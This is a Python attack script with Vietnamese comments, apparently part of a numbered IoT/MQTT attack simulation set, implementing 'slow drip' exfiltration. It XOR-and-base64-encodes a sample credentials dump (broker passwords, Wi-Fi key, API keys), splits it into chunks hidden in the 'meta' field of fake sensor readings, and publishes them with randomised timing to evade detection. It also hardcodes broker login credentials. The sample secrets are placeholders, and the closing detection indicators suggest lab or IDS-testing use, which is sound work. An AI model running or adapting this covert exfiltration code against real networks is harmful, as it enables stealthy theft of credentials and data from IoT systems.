#!/usr/bin/env python3
"""
Attack 5 — Slow Drip Exfiltration
Gửi data nhỏ giọt, mimick normal traffic nhưng payload chứa
stolen data được mã hóa (XOR + base64). Đây là kịch bản khó
phát hiện nhất vì trông giống traffic bình thường.

Chạy:
    python3 attack5_slow_drip.py --host 10.0.0.10 --topic home/sensor/temp --rate 0.2
    python3 attack5_slow_drip.py --host 10.0.0.10 --topic home/sensor/temp --rate 0.2 --user mqttadmin --password Xk9mP2vL
"""

import paho.mqtt.client as mqtt
import time
import argparse
import base64
import json
import random
import logging
import math
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s — %(message)s"
)
log = logging.getLogger(__name__)

XOR_KEY = 0x5A  # Key đơn giản cho mô phỏng

# ── Dữ liệu bí mật cần exfiltrate ─────────────────────────────────────────────
SECRET_DATA = json.dumps({
    "type":        "credentials_dump",
    "broker_user": "admin",
    "broker_pass": "iot@2024",
    "wifi_ssid":   "CorpNetwork",
    "wifi_psk":    "Enterprise@Pass",
    "api_keys":    ["key_abc123", "key_def456", "key_ghi789"],
    "internal_ips": ["192.168.1.1", "192.168.1.100", "10.0.0.10"],
    "device_id":   "thermostat-bedroom-001",
})


def xor_encode(data: str) -> str:
    """Mã hóa XOR đơn giản + base64 để nguỵ trang"""
    encoded = bytes([b ^ XOR_KEY for b in data.encode()])
    return base64.b64encode(encoded).decode()


def xor_decode(b64_data: str) -> str:
    raw     = base64.b64decode(b64_data.encode())
    decoded = bytes([b ^ XOR_KEY for b in raw])
    return decoded.decode()


def split_into_chunks(data: str, chunk_size: int) -> list:
    """Chia data thành nhiều mảnh nhỏ"""
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]


def build_normal_looking_payload(chunk_encoded: str, seq: int, total: int,
                                  sensor_type: str) -> dict:
    """
    Tạo payload trông như sensor data bình thường,
    nhưng thực ra chứa mảnh data đánh cắp trong field 'meta'
    """
    base_temp = 22.5 + math.sin(seq * 0.3) * 2 + random.uniform(-0.5, 0.5)
    return {
        "device_id": f"sensor-{sensor_type}-001",
        "timestamp": datetime.now().isoformat(),
        "readings": {
            "temperature": round(base_temp, 2),
            "humidity":    round(55 + random.uniform(-5, 5), 1),
            "battery":     round(85 - seq * 0.1, 1),
        },
        "status": "normal",
        "meta": f"fw=1.2.{seq}&chk={chunk_encoded}&s={seq}&t={total}",
    }


def run_slow_drip(host: str, port: int, topic: str,
                  rate: float, chunk_size: int,
                  username: str = None, password: str = None):
    """
    Gửi data nhỏ giọt với tốc độ và pattern giống traffic bình thường.
    rate: số message/giây (vd: 0.2 = 1 msg mỗi 5 giây)
    """
    encoded_secret = xor_encode(SECRET_DATA)
    chunks         = split_into_chunks(encoded_secret, chunk_size)
    total_chunks   = len(chunks)

    log.info(f"  Secret data size    : {len(SECRET_DATA)} bytes")
    log.info(f"  Encoded size        : {len(encoded_secret)} bytes")
    log.info(f"  Chunk size          : {chunk_size} bytes")
    log.info(f"  Total chunks        : {total_chunks}")
    log.info(f"  Exfil rate          : {rate} msg/s  (~{1/rate:.0f}s/msg)")
    log.info(f"  Estimated duration  : {total_chunks/rate:.0f}s\n")

    # ── Dùng CallbackAPIVersion mới để tránh DeprecationWarning ──────────────
    try:
        client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=f"iot-sensor-{random.randint(100, 999)}",
        )
    except AttributeError:
        # paho-mqtt < 2.0 không có CallbackAPIVersion
        client = mqtt.Client(client_id=f"iot-sensor-{random.randint(100, 999)}")

    # ── Set credentials nếu broker yêu cầu authentication ────────────────────
    if username:
        client.username_pw_set(username, password)

    connected = [False]

    def on_connect(c, u, f, rc, *args):
        connected[0] = (rc == 0)
        if rc == 0:
            log.info("  Kết nối broker thành công")
        else:
            log.error(f"  Kết nối thất bại (rc={rc}) — "
                      f"{'Sai credentials' if rc == 5 else 'Lỗi khác'}")

    client.on_connect = on_connect

    try:
        client.connect(host, port, keepalive=60)
    except ConnectionRefusedError:
        log.error(f"Không kết nối được {host}:{port} — broker có đang chạy không?")
        return

    client.loop_start()

    # Chờ kết nối tối đa 5 giây
    timeout = time.time() + 5
    while not connected[0] and time.time() < timeout:
        time.sleep(0.1)

    if not connected[0]:
        log.error("Không kết nối được broker!")
        log.error("Gợi ý: thêm --user mqttadmin --password Xk9mP2vL nếu broker bật auth")
        client.loop_stop()
        return

    sensor_types = ["temp", "humidity", "motion", "light"]
    sent_chunks  = 0
    start_time   = time.time()
    exfil_log    = []

    for seq, chunk in enumerate(chunks):
        sensor_type = sensor_types[seq % len(sensor_types)]
        payload_obj = build_normal_looking_payload(chunk, seq, total_chunks, sensor_type)
        payload_str = json.dumps(payload_obj)

        result = client.publish(topic, payload=payload_str, qos=0, retain=False)

        if result.rc == mqtt.MQTT_ERR_SUCCESS:
            sent_chunks += 1
            log.info(f"  [{seq+1:>3}/{total_chunks}] Gửi chunk {len(chunk)}B "
                     f"via topic={topic}  [payload_size={len(payload_str)}B]")
            exfil_log.append({
                "seq": seq, "chunk_size": len(chunk),
                "payload_size": len(payload_str),
                "topic": topic, "timestamp": datetime.now().isoformat(),
            })
        else:
            log.warning(f"  [{seq+1}] Gửi thất bại (rc={result.rc})")

        # Jitter ngẫu nhiên — bắt chước sensor thực
        jitter     = random.uniform(-0.3, 0.3) * (1 / rate)
        sleep_time = max(0.1, (1 / rate) + jitter)
        time.sleep(sleep_time)

    client.loop_stop()
    client.disconnect()

    elapsed  = time.time() - start_time
    avg_rate = sent_chunks / elapsed if elapsed > 0 else 0

    log.info("\n" + "=" * 60)
    log.info("  KẾT QUẢ SLOW DRIP EXFILTRATION")
    log.info(f"  Chunks gửi thành công : {sent_chunks}/{total_chunks}")
    log.info(f"  Tổng data exfiltrated : {sent_chunks * chunk_size} bytes")
    log.info(f"  Thời gian             : {elapsed:.1f}s")
    log.info(f"  Tốc độ thực tế        : {avg_rate:.3f} msg/s")
    log.info("=" * 60)

    # Xác minh reconstruct
    log.info("\n  [VERIFY] Reconstruct data từ chunks...")
    reconstructed = xor_decode(encoded_secret)
    if reconstructed == SECRET_DATA:
        log.info("  ✅ Exfiltration THÀNH CÔNG — data reconstruct khớp 100%")
    else:
        log.warning("  ⚠ Data không khớp hoàn toàn")

    # ── Lưu log ────────────────────────────────────────────────────────────────
    output = {
        "attack":         "slow_drip_exfil",
        "target":         f"{host}:{port}",
        "topic":          topic,
        "total_chunks":   total_chunks,
        "sent":           sent_chunks,
        "duration_s":     elapsed,
        "avg_rate_msg_s": avg_rate,
        "chunks_log":     exfil_log,
        "timestamp":      datetime.now().isoformat(),
    }
    with open("attack5_slowdrip_log.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    log.info("  Log → attack5_slowdrip_log.json")

    log.info("\n  [DETECTION INDICATORS]")
    log.info(f"  Msg rate          : {avg_rate:.3f}/s  (normal ~{rate:.2f}/s — KHÓ phát hiện!)")
    log.info(f"  Payload entropy   : cao (base64 encoded)")
    log.info(f"  Topic consistency : ổn định (nguỵ trang tốt)")
    log.info(f"  Payload size std  : nhỏ (chunks đều nhau)")


def main():
    parser = argparse.ArgumentParser(description="Slow Drip MQTT Exfiltration")
    parser.add_argument("--host",       default="127.0.0.1",       help="IP broker MQTT")
    parser.add_argument("--port",       type=int, default=1883,     help="Port broker")
    parser.add_argument("--topic",      default="home/sensor/temp", help="Topic nguỵ trang")
    parser.add_argument("--rate",       type=float, default=0.2,    help="Msg/giây (vd: 0.2)")
    parser.add_argument("--chunk-size", type=int,   default=32,     help="Bytes mỗi chunk")
    parser.add_argument("--user",       default="mqttadmin",        help="MQTT username")
    parser.add_argument("--password",   default="Xk9mP2vL",         help="MQTT password")
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("  ATTACK 5 — SLOW DRIP EXFILTRATION")
    log.info(f"  Target  : {args.host}:{args.port}")
    log.info(f"  Topic   : {args.topic}")
    log.info(f"  Rate    : {args.rate} msg/s")
    log.info(f"  Chunk   : {args.chunk_size} bytes")
    log.info(f"  Auth    : {args.user} / {args.password}")
    log.info("=" * 60)

    run_slow_drip(
        host=args.host,
        port=args.port,
        topic=args.topic,
        rate=args.rate,
        chunk_size=args.chunk_size,
        username=args.user,
        password=args.password,
    )


if __name__ == "__main__":
    main()
